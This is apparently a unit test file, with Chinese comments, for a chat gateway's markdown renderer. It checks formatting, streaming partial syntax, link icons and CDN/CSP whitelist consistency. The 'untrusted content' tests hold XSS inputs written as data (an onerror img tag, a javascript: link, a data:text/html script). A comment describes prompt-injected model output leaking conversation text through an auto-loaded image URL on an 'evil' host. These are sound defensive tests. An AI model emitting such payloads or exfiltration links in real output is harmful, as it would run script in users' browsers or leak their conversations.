/**
 * gateway/ui/markdown.js 的单元测试。
 *
 * 不起服务、不连数据库——这个文件是纯函数（一段文本进，一段 HTML 出），拿真浏览器去验
 * 反而看不清哪条规则错了。装进一层最小的 DOM 垫片就能跑：模块顶层只用到
 * document.addEventListener（挂那几个复制/下载按钮）和 window。
 *
 * 三类断言，各自对应 markdown.js 开头写的三条约束：
 *   1. 中文排版        —— 加粗贴着全角标点还成立、下划线不切 snake_case
 *   2. 流式半截语法    —— 补收口 or 藏起来，屏幕上不能露出 ``` 和 [标题](htt
 *   3. 正文不可信      —— 原始 HTML 转义、javascript: 与 data:text 一律拦掉
 */
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { createContext, runInContext } from 'node:vm'

/** 让 markdown.js 能在 node 里加载起来的最小垫片。渲染本身一个 DOM API 都不碰。 */
function loadMd(root) {
  const stub = () => ({ style: {}, setAttribute() {}, appendChild() {}, querySelector: () => null, querySelectorAll: () => [] })
  const ctx = {
    console,
    setTimeout,
    clearTimeout,
    WeakMap,
    URL,
    Blob: function Blob() {},
    navigator: {},
    getComputedStyle: () => ({ getPropertyValue: () => '' }),
    document: {
      createElement: stub,
      head: stub(),
      body: stub(),
      addEventListener() {},
      documentElement: { getAttribute: () => null },
      querySelectorAll: () => [],
    },
  }
  ctx.window = ctx
  ctx.globalThis = ctx
  createContext(ctx)
  runInContext(readFileSync(join(root, 'gateway/ui/markdown.js'), 'utf8'), ctx, { filename: 'markdown.js' })
  return ctx.satuMd
}

export async function runMarkdown({ root, test, assert, log }) {
  const md = loadMd(root)
  log('\n# markdown')

  /** 渲染 src，断言 HTML 里有 want、没有 no。 */
  const check = (name, src, { want = [], no = [], streaming = false } = {}) =>
    test(name, async () => {
      const out = md.render(src, { streaming })
      for (const w of want) assert(out.includes(w), `缺 ${w}\n  实际：${out}`)
      for (const n of no) assert(!out.includes(n), `不该有 ${n}\n  实际：${out}`)
    })

  // ── 基础块 ────────────────────────────────────────────────────────
  await check('段落', '你好，世界', { want: ['<p data-md="paragraph">你好，世界</p>'] })
  await check('标题', '## 二级', { want: ['<h2 data-md="heading-2">二级</h2>'] })
  await check('setext 标题', '标题\n===', { want: ['<h1 data-md="heading-1">标题</h1>'] })
  await check('分隔线', '---', { want: ['<hr data-md="rule">'] })
  await check('引用', '> 引用一句', { want: ['<blockquote data-md="blockquote">'] })
  await check('无序列表', '- 甲\n- 乙', { want: ['<ul data-md="unordered-list">', '<li data-md="list-item">甲</li>'] })
  await check('有序列表的起始序号', '3. 丙', { want: ['<ol data-md="ordered-list" start="3">'] })
  await check('任务列表', '- [x] 做完了\n- [ ] 还没', { want: ['checked', 'class="sw-task"'] })
  // 紧凑列表里父项不该被包进 <p>：包了「甲」和它的子列表之间会多出一个空行。
  await check('嵌套列表不给父项加 p', '- 甲\n  - 甲一\n- 乙', {
    want: ['<li data-md="list-item">甲<ul data-md="unordered-list">'],
    no: ['<li data-md="list-item"><p'],
  })
  await check('表格带对齐', '| 名 | 值 |\n| --- | ---: |\n| a | 1 |', {
    want: ['<div class="sw-table"', '<th>名</th>', 'style="text-align:right"'],
  })
  await check('单个换行也换行', '第一行\n第二行', { want: ['第一行<br>第二行'] })

  // ── 中文排版：@streamdown/cjk 要解决的那些 ──────────────────────────
  await check('加粗后面贴全角逗号', '**已完成**，接着说', { want: ['<strong data-md="strong">已完成</strong>，接着说'] })
  await check('斜体夹在中文里', '这是*重点*内容', { want: ['<em data-md="emphasis">重点</em>'] })
  await check('删除线', '~~作废~~了', { want: ['<del data-md="strike">作废</del>'] })
  await check('下划线不切 snake_case', '变量 snake_case_name 在这', { want: ['snake_case_name'], no: ['<em'] })
  await check('下划线在词边界才是斜体', '这是 _重点_ 哦', { want: ['<em data-md="emphasis">重点</em>'] })

  // ── 代码 / 图 / 公式 ──────────────────────────────────────────────
  await check('代码块带语言和工具条', '```ts\nconst a: number = 1\n```', {
    want: ['data-lang="ts"', 'class="language-ts"', 'data-md-act="copy"', 'data-md-act="download"'],
  })
  await check('代码块里的星号不是强调', '`a*b*c`', { want: ['<code data-md="inline-code">a*b*c</code>'], no: ['<em'] })
  await check('mermaid 走图，不走代码块', '```mermaid\ngraph TD;\nA-->B;\n```', {
    want: ['class="sw-mermaid"', 'sw-mermaid-canvas', 'graph TD;'],
  })
  await check('行内公式', '设 $E = mc^2$ 成立', { want: ['data-md="math"', 'data-tex="E = mc^2"', 'data-display="0"'] })
  await check('块级公式', '$$\n\\int_0^1 x dx\n$$', { want: ['sw-math-block', 'data-display="1"'] })
  // `$` 也是货币符号。两头不许贴空白这条规则就是为了挡住这一句。
  await check('美元金额不当公式', '售价 $100 到 $200 之间', { no: ['data-md="math"'] })

  // ── 链接 ─────────────────────────────────────────────────────────
  await check('链接', '见 [文档](https://example.com/a?b=1&c=2)', {
    want: ['href="https://example.com/a?b=1&amp;c=2"', 'rel="noopener noreferrer nofollow"'],
  })
  await check('裸 URL 自动成链接', '打开 https://example.com/x 看看', { want: ['<a data-md="link" href="https://example.com/x"'] })
  /**
   * **站外图片不自动加载**：先是一颗写着域名的按钮，人点了才换成 <img>。自动加载的话，被注入的
   * 模型输出 `![](https://evil/?d=<对话内容>)`，渲染那一刻内容就出去了，一次点击都不用。
   * 站内和 data: 的图照旧直接出。
   */
  await check('站外图片：先出按钮，不出 <img>', '![图](https://example.com/a.png)', {
    want: ['data-md-act="load-image"', 'data-src="https://example.com/a.png"', 'example.com'],
    no: ['<img'],
  })
  await check('站内图片照旧直接出', '![图](/files/a.png)', { want: ['<img data-md="image" src="/files/a.png"'] })
  await check('data: 图片照旧直接出', '![图](data:image/png;base64,aGk=)', { want: ['<img data-md="image" src="data:image/png;base64,aGk="'] })

  /**
   * **正文里的链接后面跟一枚小图标，而那枚图标长在 CSS 的 ::after 上。**
   *
   * 于是它出不出得来取决于两个文件对不对得上：这里吐出来的 `data-md` 属性，和 chat.css
   * 里那条选择器。改任何一处都不会有人报错——表现是图标**悄悄没了**，而链接看上去还是
   * 链接，谁也不会专门去看一眼。
   *
   * 图标不是装饰：Bot 列十个视频时每一项自己就是链接，这枚朝外的箭头是「这一条点得开、
   * 而且开在新标签页」的那个记号（见 bot 里 linkOutBlock 那段）。
   */
  await test('链接图标：正文吐的属性和 chat.css 那条选择器对得上', async () => {
    const html = md.render('见 [文档](https://example.com/a)')
    const css = readFileSync(join(root, 'gateway/ui/chat.css'), 'utf8')
    const rule = css.match(/\.sw-md a\[data-md='([^']+)'\]::after/)
    assert(rule, 'chat.css 里那条链接图标的规则没了')
    assert(html.includes(`data-md="${rule[1]}"`), `选择器盯着 data-md="${rule[1]}"，而正文吐的是：${html}`)
    // 只剩一个空的 ::after 也算没了：图标本身是那张 mask。
    assert(/mask:[^;]*--sw-icon-external/.test(css), '图标那张 mask 没了')
  })

  // ── 正文不可信 ────────────────────────────────────────────────────
  await check('原始 HTML 转义成文本', '<img src=x onerror=alert(1)>', { want: ['&lt;img'], no: ['<img src=x'] })
  await check('javascript: 链接被拦', '[点我](javascript:alert(1))', { no: ['href'] })
  await check('data:text 图片被拦', '![x](data:text/html;base64,PHNjcmlwdD4=)', { no: ['<img'] })

  // ── 流式：半截语法不能露原文 ────────────────────────────────────────
  await check('流式补齐半截加粗', '正在**加粗', { streaming: true, want: ['<strong data-md="strong">加粗</strong>'] })
  await check('流式补齐半截围栏', '```py\nprint(1)', { streaming: true, want: ['class="language-py"'], no: ['```'] })
  await check('流式补齐半截行内代码', '试试 `npm ru', { streaming: true, want: ['<code data-md="inline-code">npm ru</code>'] })
  await check('流式补齐半截块级公式', '$$\\int_0^1', { streaming: true, want: ['data-md="math"'] })
  // 链接补不出有意义的地址，藏起来——写完了它自己会回来。
  await check('流式藏起半截链接', '见 [文档](htt', { streaming: true, no: ['[文档]', '(htt'] })

  // ── 按块切：调用方只重画变了的那一块 ───────────────────────────────
  await test('splitBlocks 不把围栏切开', async () => {
    const blocks = md.splitBlocks('段一\n\n```js\nlet a\n\nlet b\n```\n\n段二')
    assert(blocks.length === 3, `应切成 3 块，实际 ${blocks.length}：${JSON.stringify(blocks)}`)
    assert(blocks[1].includes('let a') && blocks[1].includes('let b'), '围栏被空行切开了')
  })
  await test('splitBlocks 不把块级公式切开', async () => {
    const blocks = md.splitBlocks('段一\n\n$$\na\n\nb\n$$\n\n段二')
    assert(blocks.length === 3, `应切成 3 块，实际 ${blocks.length}：${JSON.stringify(blocks)}`)
  })

  // ── CDN 白名单：加载器、Gateway 的 CSP、桌面端的 CSP 三处一致 ───────────
  /**
   * CSP 只放行 gateway/src/ui-cdn.ts 里那几个「包@版本/」目录（放行整个 jsdelivr 等于放行
   * 任何人发的脚本）。markdown.js 的 LIBS 多一条路径、或者版本号只改了一边，浏览器就把它
   * 挡掉，而表现是静默退回纯文本——DOM 垫片里不管 CSP，只能按源码核。
   */
  await test('CDN：LIBS、ui-cdn.ts、桌面 UI_CSP 的包和版本一致', async () => {
    const tsSrc = readFileSync(join(root, 'gateway/src/ui-cdn.ts'), 'utf8')
    const list = tsSrc.match(/UI_CDN_PACKAGES = \[([^\]]*)\]/)
    assert(list, 'ui-cdn.ts 里找不到 UI_CDN_PACKAGES')
    const pkgs = [...list[1].matchAll(/'([^']+)'/g)].map((m) => m[1])
    assert(pkgs.length > 0, 'UI_CDN_PACKAGES 是空的')
    for (const p of pkgs) assert(/@\d+\.\d+\.\d+$/.test(p), `${p} 没钉到具体版本`)

    // 从 CDN 拉库的几处：markdown.js 的 LIBS，首页演示背景的 LP_THREE（pages-landing.js），下面还有 office-view.js。
    const mdSrc = readFileSync(join(root, 'gateway/ui/markdown.js'), 'utf8')
    const mdPaths = [...mdSrc.matchAll(/path: '([^']+)'/g)].map((m) => m[1])
    assert(mdPaths.length > 0, 'markdown.js 里找不到 LIBS 的 path')
    const lpSrc = readFileSync(join(root, 'gateway/ui/pages-landing.js'), 'utf8')
    const lpPaths = [...lpSrc.matchAll(/path: '(\/[^']+)'/g)].map((m) => m[1])
    assert(lpPaths.length > 0, 'pages-landing.js 里找不到 LP_THREE 的 path')
    // 第三处：浏览器里预览 Office 的那一页（office-view.js 的 LIBS）。
    const ovSrc = readFileSync(join(root, 'gateway/ui/office-view.js'), 'utf8')
    const ovPaths = [...ovSrc.matchAll(/path: '(\/[^']+)'/g)].map((m) => m[1])
    assert(ovPaths.length > 0, 'office-view.js 里找不到 LIBS 的 path')
    // 每一条都得带 SRI：这一页跑的就是文档里的内容，CDN 那头被换了包也得认得出来。
    assert([...ovSrc.matchAll(/sri: 'sha384-[A-Za-z0-9+/=]{64}'/g)].length === ovPaths.length, 'office-view.js 的 LIBS 有一条没带 SRI')
    const paths = [...mdPaths, ...lpPaths, ...ovPaths]
    for (const p of paths) {
      assert(pkgs.some((pkg) => p.startsWith(`/${pkg}/`)), `${p} 不在 UI_CDN_PACKAGES 底下，CSP 会挡掉它`)
    }
    for (const pkg of pkgs) {
      assert(paths.some((p) => p.startsWith(`/${pkg}/`)), `UI_CDN_PACKAGES 里的 ${pkg} 没人用了，从 CSP 里删掉`)
    }

    const rs = readFileSync(join(root, 'desktop/src-tauri/src/main.rs'), 'utf8')
    const mac = rs.match(/macro_rules! ui_cdn \{\s*\(\) => \{\s*"([^"]*)"/)
    assert(mac, 'main.rs 里找不到 ui_cdn! 宏')
    const want = pkgs.map((pkg) => `https://cdn.jsdelivr.net/npm/${pkg}/`).join(' ')
    assert(mac[1] === want, `桌面 UI_CSP 的 CDN 路径和 ui-cdn.ts 对不上：\n  main.rs：${mac[1]}\n  应为：   ${want}`)
    const csp = rs.slice(rs.indexOf('const UI_CSP'), rs.indexOf(');', rs.indexOf('const UI_CSP')))
    assert(!/cdn\.jsdelivr\.net[;" ]/.test(csp), '桌面 UI_CSP 又放行了整个 cdn.jsdelivr.net')
  })
}
